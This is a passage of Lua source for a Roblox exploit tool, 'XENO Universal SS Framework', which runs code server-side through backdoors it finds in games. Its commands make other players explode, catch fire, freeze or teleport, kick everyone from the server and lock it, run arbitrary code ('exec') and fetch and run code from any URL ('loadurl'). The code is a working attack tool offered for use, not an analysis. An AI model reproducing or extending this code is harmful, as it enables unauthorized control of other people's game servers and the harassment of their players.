        ssRun("pcall(function() " .. pRef(p.Name) .. '.Character:FindFirstChildWhichIsA("Humanoid").WalkSpeed = ' .. val .. " end)")
        addHistory("→ speed " .. p.Name .. " = " .. val, "#B4A0FF")
    end
end)

reg("jumppower", {"jp", "jpower"}, ";jp <plr> <n>", function(args)
    local val = tonumber(args[2]) or 100
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() local h = " .. pRef(p.Name) .. '.Character:FindFirstChildWhichIsA("Humanoid"); h.UseJumpPower = true; h.JumpPower = ' .. val .. " end)")
        addHistory("→ jumppower " .. p.Name .. " = " .. val, "#B4A0FF")
    end
end)

reg("freeze", {"fr"}, ";freeze <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() " .. pRef(p.Name) .. ".Character.HumanoidRootPart.Anchored = true end)")
        addHistory("→ freeze " .. p.Name, "#89B4FA")
    end
end)

reg("thaw", {"unfreeze"}, ";thaw <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() " .. pRef(p.Name) .. ".Character.HumanoidRootPart.Anchored = false end)")
        addHistory("→ thaw " .. p.Name, "#F9E2AF")
    end
end)

reg("tp", {"teleport"}, ";tp <plr1> <plr2>", function(args)
    local from = U.findPlayers(args[1])
    local to   = U.findPlayers(args[2] or "me")
    if #from == 0 or #to == 0 then Notify("Player not found", T.Err); return end
    for _, p in ipairs(from) do
        ssRun("pcall(function() " .. pRef(p.Name) .. ".Character.HumanoidRootPart.CFrame = "
            .. pRef(to[1].Name) .. ".Character.HumanoidRootPart.CFrame end)")
        addHistory("→ tp " .. p.Name .. " → " .. to[1].Name, "#B4A0FF")
    end
end)

reg("ff", {"forcefield"}, ";ff <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun('Instance.new("ForceField", ' .. pRef(p.Name) .. ".Character)")
        addHistory("→ ff " .. p.Name, "#A6E3A1")
    end
end)

reg("unff", {}, ";unff <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() for _,v in pairs(" .. pRef(p.Name) .. '.Character:GetChildren()) do if v:IsA("ForceField") then v:Destroy() end end end)')
        addHistory("→ unff " .. p.Name, "#F3788C")
    end
end)

reg("explode", {"boom"}, ";explode <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() local e = Instance.new('Explosion', workspace); e.Position = " .. pRef(p.Name) .. ".Character.HumanoidRootPart.Position end)")
        addHistory("→ explode " .. p.Name, "#F3788C")
    end
end)

reg("fire", {}, ";fire <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() Instance.new('Fire', " .. pRef(p.Name) .. ".Character.HumanoidRootPart) end)")
        addHistory("→ fire " .. p.Name, "#F9E2AF")
    end
end)

reg("sparkles", {"sp"}, ";sparkles <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() Instance.new('Sparkles', " .. pRef(p.Name) .. ".Character.HumanoidRootPart) end)")
        addHistory("→ sparkles " .. p.Name, "#B4A0FF")
    end
end)

reg("smoke", {}, ";smoke <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() Instance.new('Smoke', " .. pRef(p.Name) .. ".Character.HumanoidRootPart) end)")
        addHistory("→ smoke " .. p.Name, "#9399B2")
    end
end)

reg("invisible", {"invis"}, ";invisible <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() for _,v in pairs(" .. pRef(p.Name) .. ".Character:GetDescendants()) do if v:IsA('BasePart') then v.Transparency = 1 end if v:IsA('Decal') then v.Transparency = 1 end end end)")
        addHistory("→ invisible " .. p.Name, "#9399B2")
    end
end)

reg("visible", {"vis"}, ";visible <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() for _,v in pairs(" .. pRef(p.Name) .. ".Character:GetDescendants()) do if v:IsA('BasePart') and v.Name ~= 'HumanoidRootPart' then v.Transparency = 0 end if v:IsA('Decal') then v.Transparency = 0 end end end)")
        addHistory("→ visible " .. p.Name, "#CDD6F4")
    end
end)

reg("sit", {}, ";sit <plr>", function(args)
    for _, p in ipairs(U.findPlayers(args[1])) do
        ssRun("pcall(function() " .. pRef(p.Name) .. '.Character:FindFirstChildWhichIsA("Humanoid").Sit = true end)')
        addHistory("→ sit " .. p.Name, "#9399B2")
    end
end)

-- Server commands ──────────────────────────────────

reg("time", {"clocktime"}, ";time <n>", function(args)
    ssRun("game.Lighting.ClockTime = " .. (tonumber(args[1]) or 14))
    addHistory("→ time = " .. (args[1] or "14"), "#F9E2AF")
end)

reg("fog", {}, ";fog <n>", function(args)
    ssRun("game.Lighting.FogEnd = " .. (tonumber(args[1]) or 100000))
    addHistory("→ fog = " .. (args[1] or "100000"), "#9399B2")
end)

reg("gravity", {"grav"}, ";gravity <n>", function(args)
    ssRun("workspace.Gravity = " .. (tonumber(args[1]) or 196.2))
    addHistory("→ gravity = " .. (args[1] or "196.2"), "#B4A0FF")
end)

reg("music", {"play"}, ";music <id>", function(args)
    local id = tonumber(args[1]) or 0
    ssRun('local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://' .. id .. '"; s.Volume = 1; s.Looped = true; s:Play()')
    addHistory("→ music " .. id, "#B4A0FF")
end)

reg("stopmusic", {"stopsounds"}, ";stopmusic", function()
    ssRun('for _,v in pairs(workspace:GetDescendants()) do if v:IsA("Sound") then v:Stop() v:Destroy() end end')
    addHistory("→ stopped all sounds", "#9399B2")
end)

reg("message", {"msg"}, ";message <text>", function(args)
    local txt = table.concat(args, " ")
    ssRun('local m = Instance.new("Message", workspace); m.Text = "' .. txt .. '"; game:GetService("Debris"):AddItem(m, 5)')
    addHistory("→ message: " .. txt, "#B4A0FF")
end)

reg("hint", {}, ";hint <text>", function(args)
    local txt = table.concat(args, " ")
    ssRun('local h = Instance.new("Hint", workspace); h.Text = "' .. txt .. '"; game:GetService("Debris"):AddItem(h, 5)')
    addHistory("→ hint: " .. txt, "#B4A0FF")
end)

reg("shutdown", {"sd"}, ";shutdown", function()
    ssRun('for _,p in pairs(game.Players:GetPlayers()) do p:Kick("Server shutdown — XENO") end')
    addHistory("→ SERVER SHUTDOWN", "#F3788C")
end)

reg("lockserver", {"lock"}, ";lock", function()
    ssRun("game.Players.MaxPlayers = #game.Players:GetPlayers()")
    addHistory("→ server locked", "#F9E2AF")
end)

reg("unlockserver", {"unlock"}, ";unlock", function()
    ssRun("game.Players.MaxPlayers = 50")
    addHistory("→ server unlocked", "#A6E3A1")
end)

-- Utility commands ─────────────────────────────────

reg("require", {"req"}, ";require <moduleId>", function(args)
    local id = tonumber(args[1])
    if not id then Notify("Invalid module ID", T.Err); return end
    BD:requireModule(id)
    addHistory("→ require(" .. id .. ")", "#B4A0FF")
end)

reg("loadurl", {"url", "httpget"}, ";loadurl <url>", function(args)
    local url = args[1] or ""
    if url == "" then Notify("Provide a URL", T.Err); return end
    BD:loadUrl(url)
    addHistory("→ loadurl: " .. url:sub(1, 50), "#B4A0FF")
end)

reg("exec", {"execute", "run"}, ";exec <code>", function(args)
    local code = table.concat(args, " ")
    ssRun(code)
    addHistory("→ exec: " .. code:sub(1, 60), "#A6E3A1")
end)

reg("clear", {"cls"}, ";clear", function()
    cmdHistory = {}
    addHistory("Console cleared", "#9399B2")
end)

reg("status", {"info"}, ";status", function()
    if BD:isConnected() then
        addHistory("✓ Connected to: " .. BD.active.name, "#A6E3A1")
        addHistory("  Path: " .. BD.active.path, "#9399B2")
        addHistory("  Type: " .. BD.active.type, "#9399B2")
        addHistory("  Pattern: " .. BD.active.patternName, "#B4A0FF")
        addHistory("  Fingerprint: " .. BD.active.fingerprint, "#F9E2AF")
    else
        addHistory("✗ Not connected to any backdoor", "#F3788C")
    end
    addHistory("  Confirmed: " .. #BD.confirmed .. " backdoor(s)", "#9399B2")
    addHistory("  Patterns: " .. #BD.patterns .. " RE / " .. #BD.rfPatterns .. " RF", "#9399B2")
end)

reg("cmds", {"commands", "help"}, ";cmds", function()
    local listed = {}
    for _, entry in pairs(Commands) do
        if not listed[entry] then
            addHistory(entry.usage, "#B4A0FF")
            listed[entry] = true
        end
    end
end)

-- Command input handler ───────────────────────────

cmdInput.FocusLost:Connect(function(enter)
    if not enter then return end
    local raw = cmdInput.Text
    cmdInput.Text = ""
    if raw:sub(1, #CFG.Prefix) ~= CFG.Prefix then return end

    local body = raw:sub(#CFG.Prefix + 1)
    local parts = {}
    for word in body:gmatch("%S+") do parts[#parts+1] = word end
    if #parts == 0 then return end

    local cmdName = parts[1]:lower()
    table.remove(parts, 1)

    local entry = Commands[cmdName]
    if entry then
        addHistory(CFG.Prefix .. cmdName .. " " .. table.concat(parts, " "), "#8A2BE2")
        local ok, err = pcall(entry.fn, parts)
        if not ok then
            addHistory("✗ Error: " .. tostring(err), "#F3788C")
            Notify("Command error: " .. tostring(err), T.Err)
        end
    else
        addHistory("✗ Unknown: " .. cmdName .. " — try ;cmds", "#F3788C")
        Notify("Unknown command: " .. cmdName, T.Err)
    end
end)

-- Chat listener ────────────────────────────────────

LP.Chatted:Connect(function(msg)
    if msg:sub(1, #CFG.Prefix) ~= CFG.Prefix then return end
    local body = msg:sub(#CFG.Prefix + 1)
    local parts = {}
    for word in body:gmatch("%S+") do parts[#parts+1] = word end
    if #parts == 0 then return end

    local cmdName = parts[1]:lower()
    table.remove(parts, 1)

    local entry = Commands[cmdName]
    if entry then pcall(entry.fn, parts) end
end)

-- ═══════════════════════════════════════════════════
--  15 · KEYBIND TOGGLE
-- ═══════════════════════════════════════════════════

UIS.InputBegan:Connect(function(input, processed)
    if processed then return end
    if input.KeyCode == CFG.ToggleKey then
        main.Visible = not main.Visible
        if main.Visible then
            main.Size = UDim2.new(0, 0, 0, 0)
            U.tween(main, {Size = UDim2.new(0, W.Width, 0, W.Height)}, 0.4, Enum.EasingStyle.Back)
        end
    end
end)

-- ═══════════════════════════════════════════════════
--  16 · BOOT SEQUENCE
-- ═══════════════════════════════════════════════════

do
    main.Size = UDim2.new(0, 0, 0, 0)
    main.BackgroundTransparency = 1

    task.wait(0.15)
    U.tween(main, {
        Size = UDim2.new(0, W.Width, 0, W.Height),
        BackgroundTransparency = 0,
    }, 0.55, Enum.EasingStyle.Back)

    task.wait(0.6)
    switchTab("Dashboard")

    Notify("⚡ XENO v" .. CFG.Version .. " loaded", T.Primary)
    Notify("Toggle: RightShift  |  Prefix: " .. CFG.Prefix, T.Sub)
    Notify(#BD.patterns .. " fire patterns · " .. #BD.exactNames .. " signatures loaded", T.Accent)
    Notify("Hit Scan on Dashboard to begin", T.Warn)

    setStatus("Ready — " .. #BD.patterns .. " patterns loaded", T.Sub)
    statusValLbl.Text = "Ready"
    statusValLbl.TextColor3 = T.Sub

    print(string.format([[
    ═══════════════════════════════════════
     ⚡ XENO Universal SS Framework v%s
     Fingerprinted Backdoor Engine
     
     %d Fire Patterns Loaded
     %d Exact Name Signatures
     %d Name Pattern Matchers
     %d Fingerprint Profiles
     
     Toggle: RightShift | Prefix: %s
     Hit Scan on Dashboard to begin.
    ═══════════════════════════════════════
    ]], CFG.Version, #BD.patterns, #BD.exactNames, #BD.namePatterns, #BD.fingerprints, CFG.Prefix))
end
